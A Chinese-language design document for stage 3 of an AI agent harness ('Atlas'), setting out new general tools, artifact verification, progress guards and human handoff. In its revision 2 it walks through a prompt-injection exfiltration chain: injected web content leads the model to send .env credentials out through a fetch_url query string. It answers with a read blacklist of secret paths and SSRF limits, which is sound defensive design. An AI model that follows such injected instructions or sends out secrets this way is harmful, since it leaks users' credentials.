## 0. 前置决定

2026-08-28 讨论确定，**决 2 与决 3 在两份评审后已修订**。七条的共同指向只有一句话：

> **Atlas 做的是通用的思考与执行能力，网页归档只是将来众多评测 Case 中的一个。
> 能力面不由任何一个 Case 定义。**

### 0.1 两条决定的修订记录

#### 修订 1　决 2 的三场景标准有盲区：**机制工具**

评审给方案补出三个必需的新工具：`read_blob`（大结果取回）、`request_handoff`（人工接管触发）、以及接替 `write_note.delay_ms` 的可控慢工具。

**这三个没有一个能过「办公 / 代码 / 聊天常用」这一关**——它们服务的是 Harness 机制（§11.4 大结果外置、§20 人工接管、取消路径的测量），不是业务场景。硬塞进 `tools/common` 会破坏标准的纯度，放进 `cases/` 更错。

**处置：分两类，各有各的声明义务。**

| 类 | 判据 | 声明义务 |
|---|---|---|
| **场景工具** | 办公 / 代码 / 聊天三场景常用 | 文件头写出三场景各自用例，不适用要写明为什么 |
| **机制工具** | 服务某一条 Harness 机制 | 文件头**必须指出是哪一条机制、以及不做它会怎样** |

第二类的形态照抄 §2.5 规格纪律第 4 条（「每新增一个 Port 必须同时指出强制它存在的不变量」）。**这不是推翻决 2，是补它漏掉的一格。**

#### 修订 2　决 3 的不对称论证在引入 `fetch_url` 后失效

原论证：「读错文件是信息问题，写错文件是不可逆损失」。**批 2 引入 `fetch_url` 之后这条不成立**：

> **读是信息问题 ⇒ 信息可以被外发 ⇒ 读 ＋ 外发 ＝ 损失。**

具体链路（逐段核过源码）：

```text
workspace 外读放开（S12）
  → read_file / search 读到仓库根 .env（含真实端点凭证与 baseUrl）
  → 内容进入上下文（SimpleRedaction 只打 sk- 形状与 email，非该形态的配置漏网）
  → 外部网页正文注入，诱导模型调用 fetch_url("https://…/?d=<内容>")
  → GET 的 query 参数就是外发通道
```

两处让它畅通无阻：

- `EffectScope.kind` **已有 `"URL"`**（`types/tool.ts:23`），但 `effect-resolver.ts:98-100` **只对 `FILE` / `DIRECTORY` 判 `OUTSIDE_WORKSPACE`** —— URL scope 拿不到任何 riskFact；
- 决 3 之下审批本已全部放行 —— **这条链路不需要创建任何授权**，所以 §22.4【定】「不可信内容不能创建 Grant / 改变 Policy / 自动批准 Action」拦不住它。

**处置：不推翻决 3（单人本地开发期可接受），但配三条最小护栏**：

1. **读黑名单**：`.env*` / `.git/` / `.workagent-state/` / `~/.ssh` / `~/.aws` 等。
   **【定】黑名单必须同时覆盖 `read_file` 与 `search`** —— `search(kind:"content")` 一次能扫遍整棵目录树，只挡 `read_file` 等于没挡（这一条两份评审都没点到）；
2. **`fetch_url` 拒绝私网与 localhost**（防 SSRF）；
3. **URL scope 必须产出 riskFact**，进 `ResolvedEffect.dataMovement`，让「这次调用把数据发去了哪里」在 Trace 上可审计。

### 0.2 决 6 的证据、以及它的边界

「加强通用思考能力」最容易走偏的一步，是加一个 Planner 模块。本阶段明确不这么做，理由是**实测**：

| 观察 | 出处 |
|---|---|
| 归档盘点任务，模型 **4–5 次调用 / 7–8 次工具**完成，中位 9,905 token、16.3 秒 | 回归评测 §5 |
| 37 次工具调用只失败 1 次，且模型**自己纠正后完成**任务 | 回归评测 §5.2 |
| 那一次失败是**把文件路径传给了 `list_dir`** —— 因为工具集里**没有**查看单个对象的能力 | 回归评测 P2-2 |
| 阶段 1 的射程被工具卡死：「没有 `read_file`，射程是『目录元数据 → 模型加工 → 文本产物』」 | Roadmap §3 |
| 模型从任务原文抽取显式要求：**5/5 稳定、有判别力**（加一句要求 → 0/5 变 5/5） | `probe:requirement-extraction` |

**结论**：短板全在**它能看到什么、能做什么**，不在「会不会想」。所以本阶段提升思考能力的方式是**扩能力面与上下文质量**（§2.6），不是加编排模块。

> **【定】这条结论的证据边界要写明**：上面四条证据全部来自「目录元数据盘点」**这一种极简任务形态**。批 1 之后工具射程扩大约一倍，S13 的任务复杂度上一个台阶，**「瓶颈不在思考」有可能失效**。
>
> **处置不是阶段内加编排**（那违反决 6），而是**如实记录证据、留评测阶段判定**（§8 风险表已列）。写下这条，一是防止实施者中途看到短板私自加 Planner，二是防止反过来无视证据。

### 0.3 一条被探针推翻的前提（决定了两处设计）

回归评测 §5.1 把 Trial 1 的硬失败记为「**用户显式要求『给出总大小』未完整满足**」。2026-08-28 的探针**推翻了这个归因**：

- 任务原文是「给出**每个子目录的**文件数与总大小」——「总大小」被限定在子目录级，**全局合计字节数在原文里从未出现**；
- grader 却硬查 `20223`（`archive-inventory.ts:119-121`），且**没有任何一条**检查任务真正要求的「每个子目录的总大小」；
- 5 个 trial 里 **4 个是模型自愿多给的**，第 1 次没给就被判失败；
- 中性提示下模型 5/5 抽不出「全局合计」，加一句显式要求后 5/5 抽得出（有判别力）。

**那是 grader 误判，不是模型遗漏。** 两处设计据此定：

1. **不加通用 Completion Gate**（评审 pi 维度 1 的核心论据即这次失败，前提已倒）。它还会改动 §10.4【定】的循环终止条件，需独立 ADR，且判别力未经测量。**留评测阶段判定**；
2. **Artifact 级检查器不得写任务级规则**（§1.2）—— 这次误判就是把逐 Run 变化的用户要求写死成硬门槛的现场。

> **S14 必须回写回归评测报告的口径**，否则两份文档各说各话；探针脚本与原始输出一并入库，否则这条证据链有一环不可复核。

### 0.5 二次反思新增的两条（两份评审都没发现）

1. **批 1 结束时有一个已知空窗**：`read_file`（S3）能产大结果，而 Blob 外置在批 2 S6 —— **能读大文件但没有外置机制**，大内容会直接灌进 Context 撞上下文墙，而原版批 1 验收没有任何一条覆盖它。按阶段 2 `verify:persistence` F 段的形态，**用一条「已知红」判据把这个欠账标出来**：缺口应当在它被引入的那一批就可见。
2. **Verifier 组合器会让 §18.2 分支二静默退化成分支三**：`edit_file` 是首批唯一天然落在分支二的通用工具，它依赖 `observePre` / `observePost` 拍前置指纹。若 `CompositeVerifier` 只路由 `verify`、对 `observePre` 返回 `undefined`，指纹拍不到 → 崩溃后一律判「观察不了」→ 全部落进分支三 —— **而且盘上看不出来，没有任何报错**。这正好打击阶段 2 决 6 要防的那件事。批 1 验收必须专测三个方法都被正确路由。

### 0.6 反过拟合的三道机械闸门

「不做定制」这句话必须有机械判据，否则半年后没人能复核：

1. **第 6 / 6b 条边界 grep**（§2.3）——`packages/` 与 `adapters/` 不得 import `tools/`；`tools/common` 不得 import `cases/*`；
2. **两类声明**（§2.2）——场景工具写三场景用例，机制工具写它服务哪条机制；
3. **跨场景 smoke**（S13）——**三个来自不同场景、互不相干的真实任务，用同一套工具都跑通**。这是唯一能真正证伪「通用」的东西：前两道只能防止显式依赖，防不了「形状是照着某个任务长的」。

还有一道**免费的经济闸**：§16.1【定·实测】每工具约 180 token 固定开销，已单列在 `ContextFrame.fixedOverheadTokens`。10 个工具约 1800 token 起步价，与任务内容无关——**「一个 Case 一套工具」会直接反映在每次请求上，这是随时可读的过拟合警报**。

## 1. 阶段 3 要解决的问题总账

### 1.1 能力面的四个空格，都是「没有工具需要它」造成的

四个 Port 至今零实现。把代码里写的不实现理由抄下来，会发现是**同一句话**：

| Port | 代码里的原话 |
|---|---|
| `BlobStorePort` | 「大结果外置**要到 Case 01 才有真实的大结果**」 |
| `ArtifactStorePort` | 「**阶段 1 Micro Case 不产出 Artifact**」 |
| `SecretResolverPort` | 「**阶段 1 没有需要 secret 的工具**」 |
| `CapabilityLeasePort` | 「lease 语义**要到 Browser Capability 才有真需求**」 |

同族的还有：`ToolProgress` 事件无生产点（U-3）、`WAITING_FOR_INTERACTION` 全仓只出现在类型定义里、`inlineToolResultLimitTokens` 有默认值 8000 但零消费、Artifact 级 Verification 从未实现。

**不是忘了做，是没有工具需要它们。** 所以本阶段的顺序是：**先建工具面，让机制被真需求逼出来**——而不是先实现 Port 再找用例，那正是 D-14 反复警告的「盲写」。

按决 2 的标准逐个过一遍：

| Port | 判定 | 备注 |
|---|---|---|
| BlobStore | ✅ 做 | 办公读大文档 / 代码读大文件 / 聊天拉长会话，三场景全撞 |
| ArtifactStore | ✅ 做 | 三场景都产交付物。**注意这是接口重设计，不是「实现现成接口」** —— 现有 `register(input: unknown)` / `markVerified(id, ok)` 承载不了 §17 的版本链、Tombstone、lineage、来源 Run 关联、Deliverable-Verified 标记 |
| SecretResolver | ⏸ 不做 | 首批工具明确不含需要凭证的 |
| CapabilityLease | ❌ 不做 | 决 5 |

### 1.2 质量的空格：两层 Verification 只实现了一层

V05 §10.4【定】：

| 层 | 问题 | 触发点 | 现状 |
|---|---|---|---|
| Action 级 Verification | 这一步的副作用是否达成 | Attempt 完成后 | ✅ 已实现 |
| **Artifact 级 Verification** | **这个产物本身是否完整合法** | ArtifactRegistered 之后 | ❌ **零实现** |

> 【定】两者不得互相替代。**Run 层不提出自己的问题，只汇总前两层已经产生的事实。**

Action 级验证的参照物是**模型自己的意图**（`write_file` 验的是「磁盘内容 == 计划内容」），所以它对「模型的意图本身不全」在结构上是盲的——不是恰好没查到。第二层的触发点是 `ArtifactRegistered`，所以它与 ArtifactStore 是**同一块，不能拆开排**。

**三条必须在 S8 里定死的语义**（原版缺）：

1. **登记触发源**：Artifact **由工具显式产出后登记**，不由 Runtime 扫 workspace 自动派生。理由是 §17【定】「Runtime Blob 不自动升级为 Artifact」的同款——自动派生会把用户自己放进 workspace 的文件误当成本次 Run 的交付物；
2. **检查器的通用/专用分界**：产物**类型**的静态结构约束属通用，进 `tools/common/artifact-checks/`；任务业务规则属 Case，本阶段没有 Case 包可写，**因此一条都不写**；
3. **失败的 outcome 映射**：**核心交付物**（`role: "DELIVERABLE"`）检查失败 → `FAILED`；中间产物（`INTERMEDIATE` / `RESULT`）失败 → `COMPLETED_WITH_LIMITS` ＋ 具名 `incompleteItems`。原版一律降级为 `COMPLETED_WITH_LIMITS`，会让「交付物是坏的」和「某个中间步骤有瑕疵」在 outcome 上不可区分。

**【定】检查器必须有判别力。** 首批只做四项：JSON 可解析、ZIP 可解开、文本编码合法、hash 与登记一致。
**「Markdown 可解析」不做**——任何文本都是合法 Markdown，它是一个永远绿灯的闸门，正是本方案自己反复警告的形态。要做就得给出可失败的结构断言（标题层级存在、正文非空等），首批不值得。

### 1.3 从阶段 2 带进来、本阶段必须一起处理的

| 项 | 为什么在本阶段 |
|---|---|
| **P1-1** 官方入口不能选端点 | 开发期要频繁换端点验证工具行为。且它是「装配完成 ≠ 可达」的第三次显形 |
| **`interject` CLI 入口** | 从阶段 1 挂到现在。人工接管与它共用同一条运行期交互通道，**先有通道才谈得上接管** |
| **N-8** `list_dir` 错误分类 | 一切异常统一映射成 `NOT_FOUND / AFTER_MODEL_CORRECTION`。新工具会照抄这个形状，**必须在写新工具之前修** |
| **P3-26** redaction 打花文件名 | `compose.ts:435` 的 email 正则不受档位限制，办公场景一上 `read_file` 就撞 |
| **U-3** Progress Guard | `fetch_url` / 大文件读取是它的第一个真需求 |
| **R-2 的派生缺口** | `waitingSince` 只在审批事件对上设置（`run-loop.ts:735-738`），**人工接管的等待会全额计入 active** |

其余存量（N-7 `usageFieldMap`、P3-28 CLI 退出码、P2-3 审批超时口径等）走 bugfix 阶段。

#### 工具账（原版这里算错了，必须以此为准）

现状 `microCaseTools` 是 **4 个**：`list_dir` / `write_note` / `append_log` / `now`。`delay_ms` **不是工具，是 `write_note` 的一个参数**。

| 去处 | 工具 | 计 |
|---|---|---|
| `tools/common` · **场景工具** | `list_dir`、`write_file`（原 `write_note`，去掉 `delay_ms`）、`now`（迁移 3）＋ `read_file`、`stat`、`search`、`edit_file`、`fetch_url`（新增 5） | **8** |

**`slow_write` 为什么必须新建**：`verify/pairing.ts:135` 的「工具执行中被 cancel」判据用的是 `write_note` ＋ `delay_ms: 800` ＋ 定时 cancel。`write_note` 迁走并去掉 `delay_ms` 后，这条判据**失去载体**。而一个纯延迟的 noop 工具测的是「延迟被取消」，**与「写文件执行到一半被取消」不是同一个不变量场景**——`sideEffectState` 的诚实上报测不到。所以要建的是一个**可控慢的写**，不是可控慢的空转。

**固定开销基线**：`tools/common` 10 个 × 约 180 token ≈ **1800 token**（原版按 8 个估的 1440 作废）。

### 2.2 工具声明的三条硬要求

**【定】文件头必须写声明，两类各有形态：**

```ts
/**
 * read_file —— 读取文件内容。【场景工具】
 *
 * 三场景：
 *   办公：读 Word/Excel 导出的文本、读会议纪要
 *   代码：读源文件、读配置
 *   聊天：读消息导出、读附件正文
 *
 * 形态：只读、幂等 → §18.2 分支一；**可能产大结果 → 触发 Blob 外置**
 */

/**
 * read_blob —— 按 ref 取回被外置的大结果。【机制工具】
 *
 * 服务的机制：§11.4 ToolResult Materialization。
 * 不做它会怎样：大结果外置退化成**比静默截断更糟的信息完全阻断** ——
 *   模型在帧里看得到 stub，却没有任何手段拿到内容。
 */
```

**【定】`ToolDefinition` 必须完整填写**，尤其三个最容易漏的：

- `redaction` **必填**（§12.3【定】：不声明的 Tool 走默认最严格 profile，而不是默认放行）；
- `idempotency` —— 消息级恢复下它**是恢复正确性的前提**，不是可选优化（原则十五）；
- `recoveryObservation` —— 决 6 的分流依据。**注意它在 `tool.ts:163` 上目前带 `?`**，靠 verify 扫描兜底。S2 顺手去掉 `?`，让「必填」由类型强制而不是靠纪律。

grep -rn "dashscope" packages/harness-runtime/src            # 2. 端点名不进 Runtime 代码

第 6b 是「通用」这个词的机械含义：**通用工具一旦依赖某个 Case，它就不通用了**，而这件事从代码上看不出来，只能靠 grep。

### 2.4 装配变化：组合器必须路由**三个**方法

`compose.ts:314-319` 现在把 `MicroCaseToolHandler` 与 `MicroCaseVerifier` 写死。两个包共存后需要按 `toolName` 路由的组合器：

```text
CompositeToolHandler([commonHandler, microCaseHandler])
CompositeVerifier([commonVerifier, microCaseVerifier])
```

**【定】`CompositeVerifier` 必须路由 `verify` / `observePre` / `observePost` 全部三个方法。**

只路由 `verify`、让 `observePre` 返回 `undefined`，会导致：前置指纹拍不到 → 崩溃后一律判「观察不了」→ **§18.2 分支二的工具全部静默退化成分支三**。没有任何报错，盘上也看不出来——这正好打击阶段 2 决 6 要防的那件事。批 1 验收专测这一条。

**【定】组合器住在 Composition Root（`apps/cli/`），不进 Runtime。** 路由逻辑认识具体工具名，而 Runtime 不许认识任何工具——边界 4 的直接推论。

现有 8 条 `verify:*` 脚本改为装配 `[...commonTools, ...microCaseTools]`，**不需要跨包 import**（`compose()` 的 `tools` 参数本来就支持传入工具列表）。

### 2.5 迁移的两处真实代价

1. **旧 Run 不能 resume。** `resume` 分支一是「真的重新执行」，判定读的是 RunSpec 里**冻结的** `agentSpec.toolSnapshots`。工具改名换包后，老 Run 的快照里还是 `write_note`，而注册的是 `write_file`。
   **【定】不做别名表，接受「迁移前的 Run 不能 resume」，给一条明确的错误信息。** 库里只有开发期 Run，代价接近零；别名表是永久负担。
2. **`verify:pairing` 的中断判据要改写。** 见 §2.1 的 `slow_write`。脚本抬头（`pairing.ts:21`、`:268`）里「用 `write_note` 的 `delay_ms`」那两句同步改。

### 2.6 上下文质量：system prompt 与工具 description

决 6 论证「提升思考能力的方式是扩能力面**与上下文质量**」。而上下文质量最直接的载体就是 **system prompt 与工具 description ——模型的操作手册**。原版方案对这块只字未提，这是最便宜也最被忽视的抓手。

现状很具体：`compose.ts:380` 写着

```text
"- 需要了解目录内容时使用 list_dir；需要写文件时使用 write_note；"
```

工具改名后不改这句，模型会被引导去调一个**不存在的工具名**。

**S2.5 专门做这件事**（不是顺手项）：

- system prompt 按新工具面重写，含**选择指引**（什么时候该 `stat` 而不是 `list_dir`、什么时候该 `search` 而不是逐个 `read_file`、大结果怎么用 `read_blob` 取回）；
- 10 个工具的 `description` 与 `inputSchema` 描述逐个复核 —— 回归评测 P2-2 那次工具误用，直接原因就是模型不知道有更合适的工具可用；
- **【定】不得在 prompt 里写任何业务场景的规则**（「归档时要……」「写清单要……」）。写选择指引可以，写任务规则就是把过拟合搬到了 prompt 层——那是三道 grep 闸门都拦不住的地方。

四批 ＋ 跨批小步，每批一条验收脚本。**每步结束跑 `npm run typecheck`。**

### 批 1 · 通用能力面立起来

做完这批，Atlas 第一次有了「读得到内容、改得动文件、找得到东西」的射程——阶段 1 的天花板（只能看目录元数据）被打掉。

#### S1　`--endpoint` ＋ `interject` 入口

先做它，因为后面每一步都要换端点验证工具行为。

- CLI 与 `eval/suite` 加**受枚举约束**的 `--endpoint bailian|deepseek`（`compose()` 本来就支持，只是入口没暴露）；
- 启动时打印**解析后**的端点 / 声明 id / 模型 id（**绝不打印 key**）；
- **保留现有 fail-fast**（M-5、U-6）——修的是可选择性与诊断，不是绕过能力声明；
- 补 **`interject` 的 CLI 入口**：运行期监听 stdin。主循环第 ⓪ 步排空逻辑（`run-loop.ts:299`）与 `runtime.interject()`（`facade/index.ts:670`）都在，缺的一直只是调用点。

**stdin 三方复用的语义**（S10 会加第三方，这里先定死，否则三条通道会抢）：

| 状态 | 回车的含义 |
|---|---|
| `RUNNING` | 提交插话（interject） |
| `WAITING_FOR_APPROVAL` | 审批应答 |
| `WAITING_FOR_INTERACTION` | 接管完成信号 |

**非交互环境（无 TTY）下 stdin 监听优雅降级**，不得让脚本化运行卡住。

**产出判据**：两个端点都能起来（DeepSeek 受端点侧 401 影响时降为「参数被正确解析并走到凭证断言」）；运行期敲入一句话，下一轮 ContextFrame 里能看到它。

#### S2　`tools/common` 骨架 ＋ 三个迁移 ＋ 两条存量

建包，进 workspaces / tsconfig paths / include，迁 `list_dir`、`write_file`、`now`。同批：

- **N-8**：`list_dir` 错误分类。现在 `list-dir.ts:174-187` 把 EACCES / ENOTDIR / ELOOP 全折叠成 `NOT_FOUND / AFTER_MODEL_CORRECTION` —— EACCES 被报成「目录不存在」模型无从纠正；一个断链符号链接能让整页列举失败。**必须在写新工具之前修，否则五个新工具照抄这个形状**；
- **P3-26**：`compose.ts:435` 的 email 正则不受 STRICTEST 条件限制，`user@example.com.txt` 会被打成 `[REDACTED:email]`，模型随后拿损坏路径去调工具 → NOT_FOUND 循环。**放宽范围时不得削弱真实凭证的脱敏**；
- **`recoveryObservation` 去掉类型上的 `?`**（§2.2）。

**产出判据**：`typecheck` 干净；`verify:all` 51 条判据在双工具包装配下仍全绿；六条边界 grep 全过。

#### S2.5　system prompt 与工具 description 重写

见 §2.6。**这是决 6 的直接落地，不是顺手项。**

#### S3　`read_file` ＋ `stat`

两个只读幂等工具（§18.2 分支一），形态不同：

- **`stat`** —— 单对象元信息。直接依据是回归评测 P2-2：**模型缺这个能力时，会拿 `list_dir` 去探测文件**。
- **`read_file`** —— **本阶段第一个可能产大结果的工具**。契约（评审补出，原版没定）：
  - **按行分页**，不按字节 —— 字节分页会在 UTF-8 多字节字符边界劈断产生乱码；
  - 返回 `startLine` / `endLine` / `totalLines` / `truncated`，**便于与 `search` 和 `edit_file` 联动**；
  - **防御超长单行**（单行 JSON、压缩代码）：设单行最大安全长度，超出时截断该行并显式标记，不得整行灌进 Context 也不得爆内存。

**【定】工具内部不得为了「结果太大」而自行截断内容。** 超限交给 §11.4 的 Materialization（批 2）。工具只如实上报大小。
**分页 ≠ 截断**：分页是**模型可控**的（它知道还有多少、可以再取），截断是**模型不可见**的。
> 阶段 1 的血泪：`list_dir` 曾 `names.slice(0,200)` 静默截断而 output 写「共 350 项」——模型会以为自己盘点完了。

**同批加读黑名单**（决 3 修订 2 的护栏 1）。

#### S4　`search`

契约（评审补出）：

```text
search(pattern, path?, kind: "name" | "content", cursor?)
  → { total, returned, truncated, cursor?, matches: [{ path, line?, before[], match, after[] }] }
```

- **通用 ignore 过滤**：自动跳过二进制（图片/音视频/编译产物）、`.git/`、`node_modules/`。不过滤会导致搜索超时或扫出海量无意义字符；
- **content 匹配返回前后各 1–2 行上下文 ＋ 明确行号**。只返回孤立行会逼模型再发多次 `read_file`，白烧 token 与轮次；
- 沿用 `list_dir` 的稳定排序 ＋ cursor 分页（E-4 成果），错误分类沿用 S2 修好的形状；
- **读黑名单必须在这里生效**（决 3 护栏 1）——`search(kind:"content")` 一次扫遍目录树，比 `read_file` 更高效地构成外泄链路。

#### S5　`edit_file`

**精确字符串替换**（`old_string` → `new_string`，唯一匹配），不选行范围。理由是形态而非偏好：

- **可验证** —— Verification 能读回确认替换发生了；
- **非幂等 ＋ 可观察** —— 目标状态取决于起始状态，前置指纹（文件 hash）能回答「那次替换发生没发生」，落在 §18.2 **分支二**；
- 行范围在文件被并发改动后语义会漂，而唯一匹配失败是**显式错误**。

**【定】失败必须给结构化诊断**（评审补出，防死循环）：

| 失败 | 返回 |
|---|---|
| 零匹配 | 相近度最高的候选所在行号 ＋ 该行内容 |
| 多重匹配 | 匹配数 ＋ **全部命中的行号**，提示扩大上下文 |

模型输出的 `old_string` 极易因空格 / CRLF vs LF 的微小差异匹配失败；没有诊断线索它只能反复重试同一个错误——那正是 S9 要检测的无进展形态。

它是首批唯一天然落在分支二的**场景工具**（此前只有为测量而生的 `write_note`），所以 §2.4 的组合器路由在这里第一次被真正需要。

### 批 2 · 大结果与产物

#### S6　`BlobStorePort` ＋ ToolResult Materialization

按 §11.4 接线：脱敏 → schema validate → normalize/hash → countTokens → **小结果 inline / 大结果外置 Blob ＋ preview ＋ retrieval 引用**。

阈值走 `ContextBudgetPolicy.inlineToolResultLimitTokens`（`types/context.ts:128` 有定义、`budget/index.ts:39` 默认 8000、**零消费点**）。

【端点·百炼】200KB 的单个 tool_result 被接受、计 34576 token —— **外置阈值由上下文预算决定，不存在协议硬上限**。

**【定】外置必须保留协议合法的结构化 stub**（§11.5 不变量 5）。

#### S6.5　`read_blob` —— 取回通路【机制工具】

**两份评审独立命中的同一个洞**：`BlobStorePort` 只有 `put` / `get`（`ports/index.ts:341-344`），**模型侧没有任何工具能消费 ref**。

没有它，大结果外置**不是外置，是信息完全阻断**——模型在帧里看到 `[Blob: ref_123, 500KB]`，想分析其中一段时**手里没有任何手段**。这比静默截断更糟：静默截断至少给了错误的完整感，阻断是明知有东西而拿不到。

```text
read_blob(ref, offset?, limit?)   ← 分页语义与 read_file 一致（按行、显式 truncated）
```

**它是机制工具**，服务 §11.4，按 §2.2 的第二类形态声明。

#### S7　`fetch_url`

**首批里形态覆盖最高的一个** —— 它一个人同时压出三件事：

| 它是什么 | 逼出什么 |
|---|---|
| 产大结果 | S6 的 Blob 外置 ＋ S6.5 的取回 |
| 内容来自外部 | trust 链路**第一次名副其实**（`compile.ts:366` 早已把所有 tool_result 标 `EXTERNAL_UNTRUSTED`、`run-loop.ts:719` 喂给 Policy；此前流过的全是用户自己放进 workspace 的内容） |
| 慢、可取消 | 批 3 的 Progress Guard |

**契约**（评审补出，原版只写了「公开 GET」）：

- 规范化返回 `status` / `contentType` / 关键 `headers`；**4xx / 5xx 与网络超时返回结构化 ToolResult，不抛异常**（错误分类沿用 S2 修好的形状，且必须认 SDK 侧的 `APIConnectionError` 家族——N-4 的教训）；
- **二进制响应**（PDF / ZIP / 图片）不进 Context，只返回元数据；
  > **【收口批修订，2026-08-28】原文是「只返回元数据**并外置 Blob**」。后半句在当前结构下不可实现，
  > 且不是「实现漏了」：`BlobStorePort.put({content: string})` 只吃文本存不了字节，
  > `ToolExecutionContext` 里也没有 blob 句柄（外置由 Runtime 对整个工具结果做，工具拿不到 BlobStore）。
  > 口径改为「只回元数据、不外置」，**代价登记在存量清单 §0.7**：模型拿不到二进制正文、也没有取回通路。
  > 要补齐得先扩 Port 与执行上下文。写在这里而不是让代码与方案各说各话。
- **重定向跟踪有上限**；
- **拒绝私网与 localhost**（决 3 护栏 2，防 SSRF）；
- **URL scope 产出 riskFact ＋ `dataMovement`**（决 3 护栏 3）。`EffectScope.kind` 已有 `"URL"`（`types/tool.ts:23`），缺的是 `effect-resolver.ts:98-100` 里对它的风险判定 —— **改动很小，但它是外泄链路在 Trace 上可审计的唯一途径**。

**【定】不做登录态、不做 Cookie、不做浏览器**（需要凭证，而 SecretResolver 本阶段不做）。
**【定】`fetch_url` 不得内置任何「正文提取」逻辑** —— 从 HTML 里挑正文是**网页归档这个 Case 的业务语义**，一旦写进通用工具，决 1 就被从内部绕过去了。工具只负责取回内容并如实上报类型与大小。

#### S8　`ArtifactStorePort` 重设计 ＋ Artifact 级 Verification

**【定】这一步包含接口重设计，不是「实现现成接口」。** 现有 `register(input: unknown)` / `markVerified(id, ok)` 无法表达 §17 的版本链、Tombstone、lineage、来源 Run 关联、`role` 与 Deliverable-Verified 标记。排期按「重设计」估，否则会失真。

- 登记语义按 §17【定】：关联来源 Run、内容变化形成新版本、删除优先 Tombstone、**Deliverable 原则上必须 Verified**、**Runtime Blob 不自动升级为 Artifact**；
- **登记触发源**：工具显式产出后登记，**不扫 workspace 自动派生**（§1.2 第 1 条）；
- 接上恒空至今的 `RunOutcome.deliveredArtifactIds`；
- **Artifact 级 Verification**：Runtime 拥有生命周期与结算语义，检查器由 `tools/common/artifact-checks/` 提供。**首批四项**：JSON 可解析、ZIP 可解开、文本编码合法、hash 与登记一致。**不做「Markdown 可解析」**（§1.2）；
- **失败的 outcome 映射**：`DELIVERABLE` 失败 → `FAILED`；`INTERMEDIATE` / `RESULT` 失败 → `COMPLETED_WITH_LIMITS` ＋ 具名 `incompleteItems`。

**【定】检查器里不得写任何任务级规则**（§0.3 的教训）。

### 批 3 · 长任务与人机通道

#### S9　Progress Guard（U-3）

- `ToolProgress` 事件第一次有生产点：`fetch_url` 与大文件读取周期性回报（低频，30s 量级）；
- Progress Guard 消费它判定「还活着」；
- **【定】不基于流式 delta**（§16.2）——否则长下载会被误判无进展；
- **【定】进展回报不持久化**（§16.2：进程死了 Run 就结束，没有「恢复后判断上次进展到哪」这个需求）。

无进展形态**本批只接第一条**：**相同 Tool ＋ 相同 normalized input ＋ 相同 effect digest 连续 N 次** —— 它可以从 transcript 机械判定，实现廉价。
§16.2 的「多个不同调用但状态无变化」**明确推后**：判定「外部状态无变化」需要状态观察基础设施，现在没有，硬做会造出一个没有判别力的检查。

#### S10　人工接管：触发工具 ＋ 状态闭合

原版的流程图从「Runtime 请求接管」开始，但**谁、通过什么信号请求**没有定义 —— 模型表达这个意图的唯一途径是工具调用，而工具清单里没有。这一步补齐三件事：

**① `request_handoff` —— 触发工具【机制工具】**

```text
request_handoff(instructions, expectedCompletion)
```

服务 §20 人工接管。三场景都有需求（办公要人去外部系统确认、代码要人解冲突、聊天要人确认发送），但它服务的是 Harness 机制而非某个业务动作，按 §2.2 第二类声明。
**它同时是 U-8 `WAITING_FOR_USER` 那个「不存在的 ask-user 工具」的落点**——两个洞是同一个。

**② 运行语义**

```text
模型调用 request_handoff
    ↓ Run → WAITING_FOR_INTERACTION（循环阻塞在 await）
用户在终端外操作外部世界，完成后回车（S1 定义的 stdin 语义）
    ↓ Runtime 重新 Observation ＋ Verification
continue / re-plan / ask user / fail
```

**【定】完成信号不等于任务成功，必须重新 Observation**（§20.3）。这是接管与「盲目继续」的唯一区别，验收要断言观察**真的发生了**，而不只是状态流转。

**不做 PARKED lease**（决 5）。

**③ 两个状态闭合（评审补出，原版缺）**

- **持久化与 resume**：阶段 2 已把 RunStatus 落库，resume 会读出 `WAITING_FOR_INTERACTION` 却**没有任何处理分支**。补：resume 识别该状态 → **重新打印接管引导 ＋ 重新等待**，不得成为未定义的崩溃窗口，也不得直接进主循环再调一次模型；
- **等待时间从 active 扣除**：`waitingSince` 目前**只在 `ApprovalRequested` / `ApprovalDecided` 事件对上设置**（`run-loop.ts:735-738`）。接管等待若不发对应事件对，用户去外部系统操作 10 分钟回来，下一轮可能直接 `BUDGET_EXHAUSTED`。**照抄审批那套事件对形态**即可。

#### S11　取消与超时在真实慢工具上生效

`fetch_url` 是第一个**真的慢**的工具（此前只有 `delay_ms` 这个假的慢）。步骤级 `AbortSignal`（U-2 已做）要在它身上验证一次真实生效，中断后合成的 result 必须守住配对不变量。

同批建 **`slow_write`**（§2.1）并改写 `verify:pairing` 的中断判据与抬头说明。

#### 批 3 验收：`verify:progress`（新增）

| 段 | 判据 |
|---|---|
| A | 长任务途中 `ToolProgress` 真的发出、Guard 真的消费；**长任务不被误杀** |
| B | 无进展：同工具同输入同 digest 连续 N 次，Guard 触发并具名终止 |

## 4. 不得绕过清单

1. **六条边界 grep**，尤其新增的第 6 / 6b 条；
2. **两类工具声明** —— 场景工具写三场景用例，机制工具写它服务哪条机制；

6. **工具不得静默截断** —— 分页可以，截断不行；
7. **`fetch_url` 不得内置正文提取**（那是 Case 语义）；
8. **Artifact 级检查器不得写任务级规则**，且**不得引入无判别力的检查**（Markdown 恒绿是现成的反例）；
9. **大结果外置必须配对取回通路** —— 只做 stub 不给 `read_blob`，是比静默截断更糟的信息阻断；

    - **不动**：五条纪律本身 —— 每个 `continue` 由 `nextState()` 构造完整 `LoopState`；每个 `continue` 带具名 `Continue.reason`、每个 `return` 是具名 `Terminal`；消息先落盘再进 `messages`；流式 delta / 进度 / 心跳不进 `LoopState`；**循环不读端点声明**；
    - **允许动**：新增等待分支（`WAITING_FOR_INTERACTION` 的 await）、新增事件消费点（`ToolProgress` → Guard）、新增等待时间扣除的事件对；
    - **每一处新增都必须**：由 `nextState()` 构造完整 `LoopState`、带具名 reason、在 verify 段里有对应判据。
12. **`persistFacts()` 若加字段必须整体带过** —— `lastSequence` 与 `resumeBranchCounts` 都在这里栽过：漏写一个字段 ≠「这条没有」，而是**整个 Run 的那个累计量被抹掉**；
13. **读黑名单同时覆盖 `read_file` 与 `search`**；
14. **`prompt` 里不得写业务场景规则** —— 写工具选择指引可以，写任务规则是把过拟合搬到三道 grep 都拦不住的地方。

## 8. 风险

| 风险 | 表现 | 处置 |
|---|---|---|
| **工具悄悄长出 Case 形状** | `fetch_url` 里混进正文提取、`search` 里混进特定格式假设、**prompt 里混进业务规则** | 三道 grep 拦不住语义过拟合，**只有 S13 三场景 smoke 能**；prompt 那条由不得绕过 #14 兜 |
